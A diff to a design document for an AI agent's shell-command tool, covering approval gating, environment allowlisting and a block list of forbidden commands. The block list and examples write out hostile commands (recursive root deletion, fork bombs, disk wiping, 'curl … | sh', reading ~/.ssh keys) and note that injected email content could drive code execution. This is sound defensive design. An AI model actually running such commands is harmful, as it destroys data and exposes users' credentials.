@@ -118,13 +118,21 @@ timeout value.
 > keys, I want a command the agent runs to be unable to see any of them.
 
 **AC6.1** `env` run through the tool prints no variable whose name matches the
-runtime's provider-key set, `COPILOT_BROKER_TOKEN`, `ENTERPRISE_SERVICE_TOKEN`, or
-`ENTERPRISE_AUTH_SECRET`. Assert on the actual captured stdout, not on the
-constructed dict.
-**AC6.2** The environment is built by **allowlist**. A test that adds a novel
-secret-looking variable to the worker's own environment asserts it is absent from
-the child's — i.e. the test must fail if anyone converts the allowlist to a
-denylist.
+runtime's provider-key set, `DESKTOP_WORKSPACE_BROKER_TOKEN` or its legacy
+fallback `DESKTOP_BROKER_TOKEN` (`_Env.BROKER_TOKEN` / `_Env.LEGACY_BROKER_TOKEN`,
+`capabilities/desktop/workspace_backend.py:160,162`), `ENTERPRISE_SERVICE_TOKEN`,
+or `ENTERPRISE_AUTH_SECRET`. Assert on the actual captured stdout, not on the
+constructed dict. ⚠️ **This AC is name-dependent and therefore weak on its own.**
+A name that does not exist makes it vacuously green — an earlier draft of this PRD
+asserted on `COPILOT_BROKER_TOKEN`, a string that appears nowhere in the repo, so
+the test would have passed over an environment leaking the real token. Treat AC6.1
+as a regression pin for the names we know today, not as the property.
+**AC6.2** **This is the load-bearing assertion.** The environment is built by
+**allowlist**. A test adds a _novel_ secret-looking variable — a name no allowlist,
+denylist, or assertion anywhere in the tree mentions — to the worker's own
+environment and asserts it is absent from the child's. Being name-independent by
+construction, it cannot be defeated by a typo, and it fails the moment anyone
+converts the allowlist to a denylist.
 **AC6.3** `cat ~/.ssh/id_rsa` is refused before any process is spawned, at a point
 above every approval control (§9).
 **AC6.4** With the Phase-2 scratch `HOME` in force, `echo $HOME` does not print the
@@ -281,20 +289,20 @@ the one prompt-level interaction they have.
 
 Each decision is argued where it is specified. This table is the index.
 
-| #       | Decision                                                                                                                                                                                                                         | Section  |
-| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- |
-| **D1**  | A standalone `StructuredTool`, never deepagents' `execute`. Nothing gains an `execute` method on the host backend chain.                                                                                                         | §2.1, §4 |
-| **D2**  | The working directory is **bound by the runtime** to a writable granted root. The model never supplies a path — only, when >1 root exists, an opaque grant **label** from a closed set.                                          | §4.2     |
-| **D3**  | The gate is the existing **PDP** (`capabilities/policy/service.py`), the PEP is a `PolicyToolMiddleware`-shaped wrapper, and the park is `ToolAccessGate.park_for_approval`. We reuse three existing mechanisms and invent zero. | §5       |
-| **D4**  | A **fourth policy axis, `EXECUTE`**, is added to `services/backend`'s tool-use policy. It is not folded into `DESTRUCTIVE`.                                                                                                      | §6       |
-| **D5**  | Default posture is **ask every time**, with a run-scoped, `argv[0]`-keyed always-grant offered only for simple commands. `BYPASS` does not auto-run commands.                                                                    | §8       |
-| **D6**  | The never-list **populates the PDP's existing `_never` ruleset** (`service.py:200, 328-333`) plus a pre-PDP lexical screen for what that ruleset structurally cannot see.                                                        | §9       |
-| **D7**  | **v1: commands are outside undo, stated in three places.** Phase 3 adds bounded root-manifest capture. No fabricated `HostWriteRecord`, ever.                                                                                    | §10      |
-| **D8**  | The environment is **constructed from an allowlist**, never inherited. Phase 2 moves `HOME` to a per-run scratch.                                                                                                                | §11      |
-| **D9**  | **Subagents do not get the tool** in v1.                                                                                                                                                                                         | §12.3    |
-| **D10** | **No background mode, no persistent shell.** One command, one process, one result.                                                                                                                                               | §12.4    |
-| **D11** | Output cap is **64 KiB combined, tail-kept**; overflow spills into the agent scratch as a real file the agent reads back through the ordinary journaled path lane.                                                               | §13      |
-| **D12** | Per-workspace enablement, resolved from process env + grant record, **sealed at run start**.                                                                                                                                     | §7.4     |
+| #       | Decision                                                                                                                                                                                                                                                                                   | Section  |
+| ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------- |
+| **D1**  | A standalone `StructuredTool`, never deepagents' `execute`. Nothing gains an `execute` method on the host backend chain.                                                                                                                                                                   | §2.1, §4 |
+| **D2**  | The working directory is **bound by the runtime** to a writable granted root. The model never supplies a path — only, when >1 root exists, an opaque grant **label** from a closed set.                                                                                                    | §4.2     |
+| **D3**  | The gate is the existing **PDP** (`capabilities/policy/service.py`), the PEP is a `PolicyToolMiddleware`-shaped wrapper, and the park is `ToolAccessGate.park_for_approval`. We reuse three existing mechanisms and invent zero.                                                           | §5       |
+| **D4**  | A **fourth policy axis, `EXECUTE`**, is added to `services/backend`'s tool-use policy. It is not folded into `DESTRUCTIVE`.                                                                                                                                                                | §6       |
+| **D5**  | Default posture is **ask every time**, with a run-scoped, `argv[0]`-keyed always-grant offered only for simple commands. `BYPASS` does not auto-run commands.                                                                                                                              | §8       |
+| **D6**  | The never-list is one data table read twice: a **pre-PDP lexical screen** decides (it tokenises), and it **populates the PDP's existing `_never` ruleset** (`service.py:200, 328-333`) as the floor underneath — coarse, because a rule is one fullmatch glob over the whole command line. | §9       |
+| **D7**  | **v1: commands are outside undo, stated in three places.** Phase 3 adds bounded root-manifest capture. No fabricated `HostWriteRecord`, ever.                                                                                                                                              | §10      |
+| **D8**  | The environment is **constructed from an allowlist**, never inherited. Phase 2 moves `HOME` to a per-run scratch.                                                                                                                                                                          | §11      |
+| **D9**  | **Subagents do not get the tool** in v1.                                                                                                                                                                                                                                                   | §12.3    |
+| **D10** | **No background mode, no persistent shell.** One command, one process, one result.                                                                                                                                                                                                         | §12.4    |
+| **D11** | Output cap is **64 KiB combined, tail-kept**; overflow spills into the agent scratch as a real file the agent reads back through the ordinary journaled path lane.                                                                                                                         | §13      |
+| **D12** | Per-workspace enablement, resolved from process env + grant record, **sealed at run start**.                                                                                                                                                                                               | §7.4     |
 
 ---
 
@@ -310,7 +318,7 @@ Each decision is argued where it is specified. This table is the index.
 | Module         | `services/ai-backend/src/agent_runtime/capabilities/shell/` (new package)                                                      |
 
 Do **not** name it `execute`. That name is already taken in all three occupancy
-declarations by deepagents' placeholder — `conformance.py:197`
+declarations by deepagents' placeholder — `capabilities/operations/conformance.py:197`
 (`("builtin", "execute", "deepagents.middleware.filesystem.FilesystemMiddleware")`),
 `builtin_operation_catalog.json:137-144`, and an `op: "execute"` row in
 `operation_descriptors.json`. A collision there is a silent identity merge in the
@@ -396,11 +404,14 @@ class RunCommandInput(BaseModel):
         ...
 ```
 
-**Why `timeout_s` is refused rather than clamped.** OpenCode clamps silently
-(`shell.ts:347`); Hermes refuses with a nudge (`terminal_tool.py:2357-2363`).
-Refusal is correct here: a model that asked for 30 minutes and got 2 will conclude
-from the timeout that the command is broken, and retry it. A refusal tells it the
-real constraint in one turn.
+**Why `timeout_s` is refused rather than clamped.** OpenCode has **no maximum at
+all**: a model-supplied `timeout` is used as given and only a negative value is
+rejected (`packages/opencode/src/tool/shell.ts:615-618`) — `:347` is merely the
+_default_ for when the model omits the field, not a clamp. Hermes refuses above its
+cap with a nudge (`terminal_tool.py:2357-2363`). Refusal is the right of the three:
+a silent clamp means a model that asked for 30 minutes and got 2 concludes from the
+timeout that the command is broken, and retries it. A refusal tells it the real
+constraint in one turn.
 
 **Why no `cwd`.** A model-supplied path is a model-supplied authority claim, and
 the runtime already knows which roots are writable
@@ -453,7 +464,7 @@ Notes that are load-bearing:
   (`.venv/.../deepagents/backends/protocol.py:760-761`) and both prior arts'
   execution layer. Splitting them is a §14 Phase-3 item with its own cost.
 - **`reason` is a closed set**, never a free-form message, so a refusal cannot leak
-  config. Same discipline as the PDP's `_Reason` (`policy/service.py:126-142`).
+  config. Same discipline as the PDP's `_Reason` (`policy/service.py:126-141`).
 
 ### 4.4 Configuration — resolved once from env, never from a request
 
@@ -500,19 +511,19 @@ _"Policy data belongs to `backend`; policy **enforcement** stays in the runtime 
 snapshot the policy once at run start, enforce in-process, POST the facts
 afterwards. Never put a per-call HTTP hop on the tool path."_
 
-| Concern                                               | Home                                                                                                                                                                       | Precedent                                             |
-| ----------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------- |
-| The tool + its schema                                 | `agent_runtime/capabilities/shell/run_command_tool.py`                                                                                                                     | `capabilities/sandbox/execute_tool.py:1-8`            |
-| **Enforcement (PEP)**                                 | in-process, `MIDDLEWARE_ORDER[0]`, one wrapper bound to the tool at registration                                                                                           | `capabilities/mcp/middleware/policy_tool.py:1-30`     |
-| **Decision (PDP)**                                    | `PdpPolicyService.decide` — pure, total, never raises                                                                                                                      | `capabilities/policy/service.py:94-200`               |
-| Park / resume                                         | `surfaces_v2/gate.py: park_for_approval` → `langgraph_interrupt` → approval row → `RuntimeApprovalHandler`                                                                 | `docs/features/approvals.md:15-31`                    |
-| Deployment config                                     | `capabilities/shell/config.py`, from process env at start                                                                                                                  | `capabilities/sandbox/config.py:1-11`                 |
-| Run-scoped composition                                | `runtime_worker/shell_composition.py`                                                                                                                                      | `runtime_worker/sandbox_composition.py:90, 116-135`   |
-| **Policy data** — who may run commands, in which mode | **`services/backend`** — `backend_app/policies/store.py` + `routes/tool_use_policies.py`                                                                                   | `backend_app/routes/tool_use_policies.py:1-19`        |
-| Delivery to the runtime                               | one snapshot at run-create over `GET /internal/v1/policies/runtime`, folded by `ToolUsePolicySnapshot.from_response`, sealed onto `AgentRuntimeContext.user_policies_json` | `capabilities/tools/permissions.py:53-78`             |
-| Grant authority (which folders, which are writable)   | Electron main, encrypted, outside the agent-data tree                                                                                                                      | `apps/desktop/main/capabilities/grant-store.ts:22-31` |
-| App-facing policy read/write                          | `backend-facade` only                                                                                                                                                      | `backend_facade/me_routes.py:243-247, 299-305`        |
-| Consent surfaces                                      | `packages/chat-surface`                                                                                                                                                    | §14                                                   |
+| Concern                                               | Home                                                                                                                                                                       | Precedent                                              |
+| ----------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------ |
+| The tool + its schema                                 | `agent_runtime/capabilities/shell/run_command_tool.py`                                                                                                                     | `capabilities/sandbox/execute_tool.py:1-8`             |
+| **Enforcement (PEP)**                                 | in-process, `MIDDLEWARE_ORDER[0]`, one wrapper bound to the tool at registration                                                                                           | `capabilities/mcp/middleware/policy_tool.py:1-30`      |
+| **Decision (PDP)**                                    | `PdpPolicyService.decide` — pure, total, never raises                                                                                                                      | `capabilities/policy/service.py:94-200`                |
+| Park / resume                                         | `surfaces_v2/gate.py: park_for_approval` → `langgraph_interrupt` → approval row → `RuntimeApprovalHandler`                                                                 | `services/ai-backend/docs/features/approvals.md:15-31` |
+| Deployment config                                     | `capabilities/shell/config.py`, from process env at start                                                                                                                  | `capabilities/sandbox/config.py:1-11`                  |
+| Run-scoped composition                                | `runtime_worker/shell_composition.py`                                                                                                                                      | `runtime_worker/sandbox_composition.py:90, 116-135`    |
+| **Policy data** — who may run commands, in which mode | **`services/backend`** — `backend_app/policies/store.py` + `routes/tool_use_policies.py`                                                                                   | `backend_app/routes/tool_use_policies.py:1-19`         |
+| Delivery to the runtime                               | one snapshot at run-create over `GET /internal/v1/policies/runtime`, folded by `ToolUsePolicySnapshot.from_response`, sealed onto `AgentRuntimeContext.user_policies_json` | `capabilities/tools/permissions.py:53-78`              |
+| Grant authority (which folders, which are writable)   | Electron main, encrypted, outside the agent-data tree                                                                                                                      | `apps/desktop/main/capabilities/grant-store.ts:23-30`  |
+| App-facing policy read/write                          | `backend-facade` only                                                                                                                                                      | `backend_facade/me_routes.py:243-247, 299-305`         |
+| Consent surfaces                                      | `packages/chat-surface`                                                                                                                                                    | §14                                                    |
 
 **Zero HTTP hops are added to the tool path.** The `execute` mode arrives in the
 same snapshot the write/read/destructive modes already ride.
@@ -555,7 +566,7 @@ and `Action = READ | WRITE | DESTRUCTIVE` on the descriptor side
 A command is none of the three. Two options:
 
 **(a) Reuse `DESTRUCTIVE`.** No backend schema change. `DESTRUCTIVE` is the only
-rung that survives `BYPASS` (`policy/service.py:111-113`, `_posture_decision`), so
+rung that survives `BYPASS` (`policy/service.py:111-112`, `_posture_decision`), so
 the safety property holds. **But one knob then answers two questions.** A user who
 sets `destructive: block` to stop connector deletions loses `npm test`. A user who
 sets `destructive: require` to permit reviewed deletions has, without being told,
@@ -579,14 +590,42 @@ turns on unattended shell execution. That option is disqualified outright.
   `_AXIS_BY_ACTION` (`policy/service.py:~150`), which the code comment says must be
   _"mapped explicitly rather than coerced by value so a future divergence fails
   loudly at review"_.
-- `capabilities/policy/service.py:_Reason` — `APPROVAL_EXECUTE = "approval_required.execute"`.
+- `capabilities/policy/service.py:_Reason` — `APPROVAL_EXECUTE = "approval_required.execute"`
+  (the closed reason set is at `service.py:126-141`), plus a row in
+  `_APPROVAL_REASON_BY_AXIS` (`service.py:154-158`).
+- **`capabilities/policy/service.py::_posture_decision` — the ladder branch itself.**
+  A new rung, inserted **between 3.5 and 3.6** (`service.py:369-376`):
+
+  ```python
+  # 3.5½ — EXECUTE pauses in every posture unless the axis itself is AUTO.
+  if action is Action.EXECUTE and mode is not ToolUsePolicyMode.AUTO:
+      return PolicyDecision.GATE, self._Reason.APPROVAL_EXECUTE
+  ```
+
 - `packages/api-types` + the Settings UI.
+
+**⚠️ The enum work does not produce the behaviour; the branch does.** Add
+`Action.EXECUTE`, its `_AXIS_BY_ACTION` row and its reason code, stop there, and the
+next thing an `EXECUTE` call reaches is rung 3.6 —
+`if posture is Posture.BYPASS: return PolicyDecision.ALLOW, self._Reason.ALLOW`
+(`service.py:375-376`). §8.2's "`BYPASS` never auto-runs a command" would then be
+false in production while every enum test passed. The **position** is as
+load-bearing as the branch, in both directions:
+
+- **Above 3.6**, so no posture pill lifts it.
+- **Below 3.5** — `if verdict is RuleAction.ALLOW: return PolicyDecision.ALLOW`
+  (`service.py:369-370`) — so §8.3's run-scoped always-grant, which is a
+  `RuleAction.ALLOW` row in `_rules`, still resolves to `ALLOW` and is not eaten by
+  the very gate it is meant to answer.
+
+Those two constraints have exactly one satisfying slot, which is why this is
+specified here as a position rather than as "add a branch".
 
 **Decision: (b).** Two reasons beyond the conflation argument.
 
 1. **It is forward-additive by construction.** `ToolUsePolicySnapshot.from_response`
    already drops unknown kinds and modes — _"forward-additive: a future deployment
-   that adds a new mode won't blow up an older runtime"_ (`permissions.py:71-78`).
+   that adds a new mode won't blow up an older runtime"_ (`permissions.py:64-66`).
    So a newer backend against an older runtime degrades to the default rather than
    crashing, and the rollout ordering is free.
 2. **The `BYPASS` semantics need their own home.** §8 asserts that `BYPASS` must
@@ -623,7 +662,7 @@ ships (§17). This reproduces `SandboxExecuteToolFactory.build`'s posture
 
 Security invariant §1 says permission checks happen **twice** for MCP tools — list
 time and call time — so _"a scope revoked mid-run is caught at call time"_
-(`docs/architecture/04-security-invariants.md:15-25`). A builtin has no card and
+(`services/ai-backend/docs/architecture/04-security-invariants.md:15-25`). A builtin has no card and
 therefore misses `is_card_authorized` (`capabilities/tools/permissions.py:152`).
 `run_in_sandbox` reimplements the property by hand: the closure re-reads
 `adapter.availability` on every call (`execute_tool.py:86-96`).
@@ -637,7 +676,7 @@ Failing that recheck returns `status: "unavailable"`, never a fallback root.
 
 Per-workspace, because "I trust the agent to run commands in `~/code/my-project`"
 is a different sentence from "I trust the agent to run commands." The grant record
-in Electron main (`apps/desktop/main/capabilities/grant-store.ts:22-31` — deliberately
+in Electron main (`apps/desktop/main/capabilities/grant-store.ts:23-30` — deliberately
 outside the agent-data tree "so a compromised run cannot rewrite the authority list
 it runs under") gains a boolean. It is settable **only** from the Settings/attach
 flow, never from a runtime call. `GrantMode` (`apps/desktop/main/capabilities/types.ts:23`)
@@ -648,6 +687,30 @@ access and adding a fourth would imply an ordering (`read_write_no_delete` <
 ⚠️ The broker's `ADVERTISED_METHODS` gains **nothing** (`apps/desktop/main/capabilities/broker.ts:105-121`).
 The runtime reads the flag from the existing active-grant snapshot. No new IPC
 verb, and specifically **no execution verb over the broker**.
+
+⚠️ **There is no write path for this flag today, and the gap is larger than "add a
+field."** `GrantStore` exposes exactly two mutations: `create`
+(`grant-store.ts:146`, taking `CreateGrantInput = { root, mode, label,
+allowedPathPrefixes?, expiresAt? }`, `:70-78`) and `revoke` (`:248`). **There is no
+update method of any kind.** Above it, `CapabilityService` exposes only
+`requestFolderGrant` / `listGrants` / `revokeGrant` (`capabilities/service.ts:78-112`),
+reached over three of the four allowlisted capability IPC channels
+(`capabilities/channels.ts:15-24`, handlers at `ipc/handlers.ts:424-461`) — and none
+of them mutates an existing grant. So "the grant record gains a boolean" is three
+work items:
+
+1. the field on `Grant` and on `CreateGrantInput` (`types.ts`,
+   `grant-store.ts:70-78`), so the attach flow can set it at mint time;
+2. **a `GrantStore` mutation for an EXISTING grant** — the Settings-toggle case —
+   which does not exist in any form today;
+3. a fifth capability channel, its `CapabilityService` method, and its params
+   schema alongside `RequestFolderGrantParamsSchema` / `RevokeGrantParamsSchema`,
+   since the renderer has no other way to reach main.
+
+Item 2 is the one that will be skipped, because item 1 alone _looks_ sufficient:
+`requestFolderGrant` mints and returns a grant, so a toggle implemented as "mint a
+new grant" would compile, appear to work, and quietly leave the previous grant
+active beside it. Estimate this as real main-process work, not a field.
 
 ### 7.4 Sealed at run start
 
@@ -750,7 +813,7 @@ and Hermes' own design concedes that its classifier is insufficient alone. So:
 
 The second reason is specific to us. Our product ingests untrusted text from
 connectors — email, Discord, web. Security invariant §4 names model output, MCP
-results and connector payloads as untrusted (`docs/architecture/04-security-invariants.md:64-77`),
+results and connector payloads as untrusted (`services/ai-backend/docs/architecture/04-security-invariants.md:64-77`),
 and the filesystem README states the consequence: this _"turns 'summarize this
 email' into a path to arbitrary code execution"_ (`docs/plan/filesystem-capability/README.md:56-59`).
 **A human reading the literal command before it runs is the only control in this
@@ -766,7 +829,10 @@ auto"_ — its own module says bypass _"removes the approval **pause**. It never
 removes the ledger, and it never creates a second way to touch the disk"_
 (`execution/filesystem_bypass.py:1-20`). A command is exactly a second way to touch
 the disk. Under `Posture.BYPASS`, the `EXECUTE` axis resolves to `ask` regardless;
-this is an invariant with a test, not a default (§16.1).
+this is an invariant with a test, not a default (§16.1). **It is also not free:**
+the ladder's rung 3.6 is `if posture is Posture.BYPASS: return ALLOW`
+(`policy/service.py:375-376`), so this sentence is true only because §6 inserts an
+`EXECUTE` gate immediately above it. Read that bullet before implementing this one.
 
 ### 8.3 The always-grant: run-scoped, `argv[0]`-keyed, simple-commands-only
 
@@ -785,6 +851,28 @@ which already carries `decision_scope ∈ {once, always}` on the resume wire
 That last rule is Hermes' (`approval.py:2489-2519`) and it is the one that makes
 the whole scheme sound: `pytest && curl https://x | sh` has `argv[0] == "pytest"`,
 so without it a `pytest` grant would authorise anything.
+
+**Mechanically the grant is a `RuleAction.ALLOW` row in `_rules`, and that placement
+is what lets it survive §6's `EXECUTE` gate.** `PermissionRuleset.with_allow`
+appends one ALLOW rule per pattern (`rules.py:214-228`) — this is already what an
+`always` reply writes — and the session ruleset is merged after config, so a mid-run
+`always` overrides a broader default and never the reverse (`PermissionRuleset`
+docstring, `rules.py:156-161`). It is read at rung **3.5**
+(`if verdict is RuleAction.ALLOW: return PolicyDecision.ALLOW`,
+`policy/service.py:369-370`), which sits one rung **above** the `EXECUTE` gate §6
+inserts: an always-granted command therefore returns `ALLOW` before the gate is
+reached, and everything else falls through to it. Three consequences worth writing
+down, because each is a way to get this subtly wrong:
+
+- **The patterns are whole-command globs, exactly as in §9.2** — a rule matches by
+  `fullmatch` over the entire command line (`rules.py:98-101, 148-153`), so an
+  `argv[0]` grant for `pytest` is authored as the **pair** `pytest` and `pytest *`.
+  Not `pytest*`: that has no word boundary and would also allow
+  `pytest-watch --exec "curl … | sh"`. The trailing space is the boundary.
+- **It cannot lift a never-row.** `_never` is a separate ruleset read at rung 3.1
+  (`service.py:328-333`), above `_rules` and above every posture (AC7.3).
+- **It cannot lift a `deny`/`ask` the user authored.** Those are read at rung 3.3
+  (`service.py:341-348`), above 3.5, so a tightening still wins.
 
 **Why `argv[0]` and not OpenCode's arity-prefix.** OpenCode generalises to
 `git commit *` / `pytest *` via a ~140-entry hand-written table
@@ -829,7 +917,7 @@ if self._never.verdict(descriptor.urn, subjects) is RuleAction.DENY:
 
 `self._never` is a `PermissionRuleset` (`service.py:200`), the class docstring
 confirms _"the never-list, a workspace `BLOCK` and the DESTRUCTIVE rung all
-surviving BYPASS"_ (`service.py:111-113`), and the wire key already exists:
+surviving BYPASS"_ (`service.py:111-112`), and the wire key already exists:
 `PermissionRuleset.Keys.NEVER = "never"` (`capabilities/policy/rules.py:171`), carried
 on `user_policies_json`.
 
@@ -838,46 +926,124 @@ matched against subjects that already include the command string.
 
 ### 9.2 The rows
 
-Expressed as **data**, in `capabilities/shell/never_list.py`, shipped as a frozen
-default ruleset merged _before_ any user-authored rules (order is precedence:
-`PermissionRuleset.merge` concatenates and `evaluate` is last-match-wins,
-`rules.py:159-184` — so the shipped floor must be merged such that no user rule can
-override it; see §9.5).
+Expressed as **data**, in `capabilities/shell/never_list.py` — one table, read by
+two mechanisms with different powers:
 
-| Class                                    | Shape                                                                                                                                                        | Why                                                                                                                                                                                   |
-| ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Root/home recursive delete               | `rm -rf /`, `rm -rf ~`, `rm -rf $HOME`, `rm -fr` and flag permutations                                                                                       | The single most common catastrophic accident.                                                                                                                                         |
-| Filesystem destruction                   | `mkfs*`, `dd of=/dev/*`, redirect to `/dev/(disk\|sd\|nvme)*`                                                                                                | Unrecoverable, never a legitimate agent action.                                                                                                                                       |
-| Machine state                            | `shutdown`, `reboot`, `halt`, `poweroff`, `init 0\|6`, `systemctl poweroff\|reboot`                                                                          | Destroys the run and the evidence.                                                                                                                                                    |
-| Privilege                                | `sudo`, `doas`, `su` in **any** position; `sudo -S` specifically                                                                                             | We never run privileged. `-S` reads a password from the stdin we closed — that is credential brute-forcing (Hermes `approval.py:472-517`).                                            |
-| Fork bomb                                | `:(){ :\|:& };:` and spelling variants                                                                                                                       | —                                                                                                                                                                                     |
-| **Pipe-to-interpreter from the network** | `curl … \| sh`, `wget … \| bash`, `… \| python -`, `iwr … \| iex`                                                                                            | The single highest-value injection shape. AC9.3.                                                                                                                                      |
-| **Credential paths**                     | any subject matching `~/.ssh/**`, `~/.aws/**`, `~/.gnupg/**`, `~/.kube/**`, `~/.docker/**`, `~/.azure/**`, `~/.password-store/**`, `**/Library/Keychains/**` | Exactly `SENSITIVE_ROOT_SEGMENTS` (`apps/desktop/main/capabilities/path-validation.ts:313-323`) — the same list the grant layer refuses to grant over. §5 covers keeping it one list. |
-| **Credential filenames**                 | `id_rsa*`, `id_ed25519*`, `*.pem`, `*.p12`, `.netrc`, `.pgpass`, `credentials`, `.env` and `.env.*`                                                          | Exactly `SENSITIVE_FILE_RULES` (`path-validation.ts:854-871`), which the broker already applies to _reads_. A command must not be the way around a rule the read path enforces.       |
+- **the §9.3 lexical screen — primary.** It sees the full, untruncated command
+  string and can **tokenise** it, so it can say "`argv[0]` is `sudo`", "this `rm`
+  operand resolves to `/`", "this pipeline's sink is an interpreter".
+- **the `_never` ruleset — the floor.** It cannot tokenise. A `PermissionRule`
+  `fullmatch`es **two** globs and ANDs them — one against the permission (the
+  capability URN), one against the subject (`rules.py:148-153`) — and the subject
+  half sees a single opaque string, so its rows are coarse whole-command patterns.
 
-`PermissionRule.expand` already handles the `~` / `$HOME` prefix portably
-(`rules.py:104-122`), so the credential rows are authored as `~/.ssh/**` and expand
-once at config-parse time — _"never inside the PDP's `decide`, which reads no
-globals."_
+The shipped floor is merged **LAST** into `_never`, because `evaluate` is
+last-match-wins (`PermissionRuleset.evaluate`, `rules.py:173-184`) and `merge`
+concatenates (`rules.py:206-212`). §9.5 is the authoritative statement of that
+order; it is stated once, there, so the two cannot drift apart.
 
-### 9.3 The pre-PDP lexical screen — for what `_never` structurally cannot see
+**⚠️ A `_never` row is a WHOLE-COMMAND glob. It is not a path pattern, and the
+obvious way to author this table does not work.** Three mechanical facts, each
+verified against source:
 
-Two properties of the ruleset matter here and both are real limits, verified:
+1. **There is one subject, and it is the entire command line.**
+   `PolicySubjects.of` folds the URN plus _every top-level string argument_
+   (`rules.py:345-359`, values at `:361-368`). `RunCommandInput` has exactly one
+   string field — `command` — so the subject list for a call is
+   `(urn, "cat ~/.ssh/id_rsa")`. **There is no path subject for a path pattern to
+   match against.**
+2. **Matching is `fullmatch` over that whole subject.** `Wildcard.match` compiles
+   the pattern and calls `.fullmatch(...)` (`rules.py:98-101`), and
+   `PermissionRule.matches` applies it to the subject whole (`rules.py:148-153`).
+   So `~/.ssh/**` never fires on `cat ~/.ssh/id_rsa`; `rm -rf /` never fires on
+   `rm -rf / --no-preserve-root`; `shutdown` never fires on `shutdown -h now`; and
+   `sudo` "in any position" is not something a fullmatch can express at all.
+3. **`~` expands on the PATTERN side only.** See the paragraph after the table.
+
+**The pattern vocabulary, exactly.** `Wildcard._compile` escapes `.+^${}()|[]\` to
+literals and then substitutes only `*` → `.*` and `?` → `.`, compiling with
+`re.DOTALL` (`rules.py:125-134`; the escape set is at `:90`). Four consequences an
+author must internalise:
+
+- **No character classes, no alternation, no anchors.** `*rm *-[rf]* /*` matches a
+  literal `[rf]`, not "r or f". One row per spelling — `-rf` and `-fr` are two rows.
+- **`*` crosses `/` and newlines.** Deliberate, and documented as such
+  (`rules.py:83-87`); it is what makes a leading `*` a usable "anywhere in the line"
+  prefix, and what lets one row see a multi-line command.
+- **Case-sensitive.** `SUDO` is a different string.
+- **Subjects are truncated at 1024 characters** (§9.3), so no floor row can fire on
+  a long command. The screen has no such limit.
+
+| Class                                    | Shape                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Why                                                                                                                                                                                                                                                                                                                                                                      |
+| ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Root/home recursive delete               | **screen:** `argv[0] == rm` with a recursive+force flag set and an operand resolving to `/`, `~` or `$HOME`. **floor:** `*rm -rf /`, `*rm -fr /`, `*rm -rf ~`, `*rm -fr ~`, `*rm -rf $HOME`, `*rm -fr $HOME` — deliberately anchored at end-of-line, so `rm -rf /Users/me/build` passes and `rm -rf / --no-preserve-root` is a floor **miss** the screen catches.                                                                                                                                                                                                                                                                                                                                                                                                                                                         | The single most common catastrophic accident.                                                                                                                                                                                                                                                                                                                            |
+| Filesystem destruction                   | **screen:** `argv[0]` matching `mkfs*`; a `dd` invocation with `of=` under `/dev/`; any redirect target under `/dev/(disk\|sd\|nvme)`. **floor:** `mkfs*`, `*mkfs *`, `*dd *of=/dev/*`, `* >/dev/disk*`, `* > /dev/disk*`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | Unrecoverable, never a legitimate agent action.                                                                                                                                                                                                                                                                                                                          |
+| Machine state                            | **screen:** `argv[0] ∈ {shutdown, reboot, halt, poweroff}`; `init 0\|6`; `systemctl poweroff\|reboot`. **floor:** two rows per binary — `shutdown` and `*shutdown *`, `reboot` and `*reboot *`, and so on — plus `*init 0`, `*init 6`, `*systemctl poweroff*`, `*systemctl reboot*`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | Destroys the run and the evidence.                                                                                                                                                                                                                                                                                                                                       |
+| Privilege                                | **screen:** a `sudo` / `doas` / `su` token in **command position**, and `sudo -S` anywhere. **floor:** `sudo`, `*sudo *`, `doas`, `*doas *`, `*sudo -S*`. `su` is omitted from the floor on purpose — `*su *` fires on `echo su x`, and a two-letter binary has no usable glob form.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | We never run privileged. `-S` reads a password from the stdin we closed — that is credential brute-forcing (Hermes `approval.py:486-515`).                                                                                                                                                                                                                               |
+| Fork bomb                                | **screen:** the `:(){ :\|:& };:` token shape and spelling variants. **floor:** `*:(){*};:*` — every metacharacter in it is escaped to a literal by `_compile`, which is exactly why this one row works.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | —                                                                                                                                                                                                                                                                                                                                                                        |
+| **Pipe-to-interpreter from the network** | **screen:** a pipeline whose source is `curl` / `wget` / `iwr` and whose sink `argv[0]` is an interpreter. **floor:** `*curl *\|*sh*`, `*curl *\|*bash*`, `*curl *\|*python*`, `*wget *\|*sh*`, `*wget *\|*bash*`, `*iwr *\|*iex*` (the `\|` compiles to a literal pipe).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | The single highest-value injection shape. AC9.3.                                                                                                                                                                                                                                                                                                                         |
+| **Credential paths**                     | **screen:** any token resolving to a path under one of the sensitive root segments. **floor:** three rows per segment — `*/<seg>`, `*/<seg>/*`, `*/<seg> *` — because a fullmatch needs one row for each way the segment can end the line, carry more path, or be followed by a space. **Never author these as `~/.ssh/**`;\*\* see the paragraph below.                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | The segment list is `SENSITIVE_ROOT_SEGMENTS` (`apps/desktop/main/capabilities/path-validation.ts:313-323`) — **reference it, do not retype it here.** It is the same list the grant layer refuses to grant over; §5 covers keeping it one list. An earlier draft of this table retyped it and silently dropped an entry, which is the whole argument for the reference. |
